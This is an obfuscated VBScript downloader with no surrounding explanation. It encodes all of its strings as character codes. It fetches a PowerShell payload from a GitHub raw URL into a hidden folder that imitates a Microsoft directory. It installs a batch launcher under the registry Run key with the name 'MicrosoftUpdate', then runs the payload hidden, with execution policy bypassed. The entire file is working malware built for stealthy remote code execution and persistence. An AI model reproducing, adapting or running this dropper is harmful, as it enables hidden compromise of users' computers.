Option Explicit

Dim ws, fso, url, ps1, folder, bat
Set ws = WScript.CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

url = Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(115)&Chr(58)&Chr(47)&Chr(47)&Chr(103)&Chr(105)&Chr(116)&Chr(104)&Chr(117)&Chr(98)&Chr(46)&Chr(99)&Chr(111)&Chr(109)&Chr(47)&Chr(107)&Chr(111)&Chr(110)&Chr(115)&Chr(111)&Chr(108)&Chr(111)&Chr(121)&Chr(117)&Chr(110)&Chr(47)&Chr(115)&Chr(105)&Chr(103)&Chr(111)&Chr(114)&Chr(116)&Chr(97)&Chr(45)&Chr(112)&Chr(115)&Chr(49)&Chr(47)&Chr(114)&Chr(97)&Chr(119)&Chr(47)&Chr(114)&Chr(101)&Chr(102)&Chr(115)&Chr(47)&Chr(104)&Chr(101)&Chr(97)&Chr(100)&Chr(115)&Chr(47)&Chr(109)&Chr(97)&Chr(105)&Chr(110)&Chr(47)&Chr(55)&Chr(48)&Chr(49)&Chr(46)&Chr(112)&Chr(115)&Chr(49)

folder = ws.ExpandEnvironmentStrings(Chr(37)&Chr(65)&Chr(80)&Chr(80)&Chr(68)&Chr(65)&Chr(84)&Chr(65)&Chr(37)) & Chr(92) & Chr(77)&Chr(105)&Chr(99)&Chr(114)&Chr(111)&Chr(115)&Chr(111)&Chr(102)&Chr(116)&Chr(92)&Chr(87)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(115)
ps1 = folder & Chr(92) & Chr(115)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(46)&Chr(112)&Chr(115)&Chr(49)
bat = folder & Chr(92) & Chr(77)&Chr(105)&Chr(99)&Chr(114)&Chr(111)&Chr(115)&Chr(111)&Chr(102)&Chr(116)&Chr(46)&Chr(98)&Chr(97)&Chr(116)

On Error Resume Next

If Not fso.FolderExists(folder) Then
    fso.CreateFolder(folder)
    ws.Run Chr(99)&Chr(109)&Chr(100)&Chr(32)&Chr(47)&Chr(99)&Chr(32)&Chr(97)&Chr(116)&Chr(116)&Chr(114)&Chr(105)&Chr(98)&Chr(32)&Chr(43)&Chr(104)&Chr(32)&Chr(43)&Chr(115)&Chr(32)&Chr(34)&folder&Chr(34), 0, True
End If

Call DownloadScript(url, ps1)
Call CreateBatFile(ps1, bat)

ws.RegWrite Chr(72)&Chr(75)&Chr(67)&Chr(85)&Chr(92)&Chr(83)&Chr(111)&Chr(102)&Chr(116)&Chr(119)&Chr(97)&Chr(114)&Chr(101)&Chr(92)&Chr(77)&Chr(105)&Chr(99)&Chr(114)&Chr(111)&Chr(115)&Chr(111)&Chr(102)&Chr(116)&Chr(92)&Chr(87)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(119)&Chr(115)&Chr(92)&Chr(67)&Chr(117)&Chr(114)&Chr(114)&Chr(101)&Chr(110)&Chr(116)&Chr(86)&Chr(101)&Chr(114)&Chr(115)&Chr(105)&Chr(111)&Chr(110)&Chr(92)&Chr(82)&Chr(117)&Chr(110)&Chr(92)&Chr(77)&Chr(105)&Chr(99)&Chr(114)&Chr(111)&Chr(115)&Chr(111)&Chr(102)&Chr(116)&Chr(85)&Chr(112)&Chr(100)&Chr(97)&Chr(116)&Chr(101), bat, Chr(82)&Chr(69)&Chr(71)&Chr(95)&Chr(83)&Chr(90)

If fso.FileExists(ps1) Then
    ws.Run Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)&Chr(32)&Chr(45)&Chr(69)&Chr(120)&Chr(101)&Chr(99)&Chr(32)&Chr(66)&Chr(121)&Chr(112)&Chr(97)&Chr(115)&Chr(115)&Chr(32)&Chr(45)&Chr(87)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(119)&Chr(32)&Chr(72)&Chr(105)&Chr(100)&Chr(100)&Chr(101)&Chr(110)&Chr(32)&Chr(45)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(32)&Chr(34)&ps1&Chr(34), 0, False
End If

ws.Run Chr(99)&Chr(109)&Chr(100)&Chr(32)&Chr(47)&Chr(99)&Chr(32)&Chr(97)&Chr(116)&Chr(116)&Chr(114)&Chr(105)&Chr(98)&Chr(32)&Chr(43)&Chr(104)&Chr(32)&Chr(43)&Chr(115)&Chr(32)&Chr(34)&folder&Chr(34)&Chr(32)&Chr(47)&Chr(115)&Chr(32)&Chr(47)&Chr(100), 0, True

Sub DownloadScript(url, path)
    Dim xhr, stream
    On Error Resume Next
    Set xhr = CreateObject(Chr(77)&Chr(83)&Chr(88)&Chr(77)&Chr(76)&Chr(50)&Chr(46)&Chr(83)&Chr(101)&Chr(114)&Chr(118)&Chr(101)&Chr(114)&Chr(88)&Chr(77)&Chr(76)&Chr(72)&Chr(84)&Chr(84)&Chr(80)&Chr(46)&Chr(54)&Chr(46)&Chr(48))
    xhr.SetOption(2) = 13056
    xhr.Open Chr(71)&Chr(69)&Chr(84), url, False
    xhr.Send
    If xhr.Status = 200 Then
        Set stream = CreateObject(Chr(65)&Chr(68)&Chr(79)&Chr(68)&Chr(66)&Chr(46)&Chr(83)&Chr(116)&Chr(114)&Chr(101)&Chr(97)&Chr(109))
        stream.Type = 1
        stream.Open
        stream.Write xhr.responseBody
        stream.SaveToFile path, 2
        stream.Close
        Set stream = Nothing
    End If
    If fso.FileExists(path) Then
        ws.Run Chr(99)&Chr(109)&Chr(100)&Chr(32)&Chr(47)&Chr(99)&Chr(32)&Chr(97)&Chr(116)&Chr(116)&Chr(114)&Chr(105)&Chr(98)&Chr(32)&Chr(43)&Chr(104)&Chr(32)&Chr(43)&Chr(115)&Chr(32)&Chr(34)&path&Chr(34), 0, True
    End If
End Sub

Sub CreateBatFile(ps1Path, batPath)
    Dim file, appDataPath, psPath
    appDataPath = ws.ExpandEnvironmentStrings(Chr(37)&Chr(65)&Chr(80)&Chr(80)&Chr(68)&Chr(65)&Chr(84)&Chr(65)&Chr(37))
    psPath = appDataPath & Chr(92)&Chr(77)&Chr(105)&Chr(99)&Chr(114)&Chr(111)&Chr(115)&Chr(111)&Chr(102)&Chr(116)&Chr(92)&Chr(87)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(115)&Chr(92)&Chr(115)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(46)&Chr(112)&Chr(115)&Chr(49)
    
    Set file = fso.CreateTextFile(batPath, True)
    
    file.WriteLine Chr(64)&Chr(101)&Chr(99)&Chr(104)&Chr(111)&Chr(32)&Chr(111)&Chr(102)&Chr(102)
    file.WriteLine Chr(115)&Chr(101)&Chr(116)&Chr(108)&Chr(111)&Chr(99)&Chr(97)&Chr(108)
    file.WriteLine Chr(115)&Chr(101)&Chr(116)&Chr(32)&Chr(34)&Chr(112)&Chr(115)&Chr(102)&Chr(105)&Chr(108)&Chr(101)&Chr(61)&psPath&Chr(34)
    file.WriteLine Chr(105)&Chr(102)&Chr(32)&Chr(110)&Chr(111)&Chr(116)&Chr(32)&Chr(101)&Chr(120)&Chr(105)&Chr(115)&Chr(116)&Chr(32)&Chr(34)&Chr(37)&Chr(112)&Chr(115)&Chr(102)&Chr(105)&Chr(108)&Chr(101)&Chr(37)&Chr(34)&Chr(32)&Chr(101)&Chr(120)&Chr(105)&Chr(116)&Chr(32)&Chr(47)&Chr(98)
    file.WriteLine Chr(97)&Chr(116)&Chr(116)&Chr(114)&Chr(105)&Chr(98)&Chr(32)&Chr(43)&Chr(104)&Chr(32)&Chr(43)&Chr(115)&Chr(32)&Chr(34)&Chr(37)&Chr(112)&Chr(115)&Chr(102)&Chr(105)&Chr(108)&Chr(101)&Chr(37)&Chr(34)&Chr(32)&Chr(62)&Chr(110)&Chr(117)&Chr(108)&Chr(32)&Chr(50)&Chr(62)&Chr(38)&Chr(49)
    file.WriteLine Chr(115)&Chr(116)&Chr(97)&Chr(114)&Chr(116)&Chr(32)&Chr(47)&Chr(109)&Chr(105)&Chr(110)&Chr(32)&Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)&Chr(46)&Chr(101)&Chr(120)&Chr(101)&Chr(32)&Chr(45)&Chr(69)&Chr(120)&Chr(101)&Chr(99)&Chr(32)&Chr(66)&Chr(121)&Chr(112)&Chr(97)&Chr(115)&Chr(115)&Chr(32)&Chr(45)&Chr(87)&Chr(105)&Chr(110)&Chr(100)&Chr(111)&Chr(119)&Chr(32)&Chr(72)&Chr(105)&Chr(100)&Chr(100)&Chr(101)&Chr(110)&Chr(32)&Chr(45)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(32)&Chr(34)&Chr(37)&Chr(112)&Chr(115)&Chr(102)&Chr(105)&Chr(108)&Chr(101)&Chr(37)&Chr(34)
    file.WriteLine Chr(101)&Chr(120)&Chr(105)&Chr(116)
    
    file.Close
    
    ws.Run Chr(99)&Chr(109)&Chr(100)&Chr(32)&Chr(47)&Chr(99)&Chr(32)&Chr(97)&Chr(116)&Chr(116)&Chr(114)&Chr(105)&Chr(98)&Chr(32)&Chr(43)&Chr(104)&Chr(32)&Chr(43)&Chr(115)&Chr(32)&Chr(34)&batPath&Chr(34), 0, True
End Sub

WScript.Quit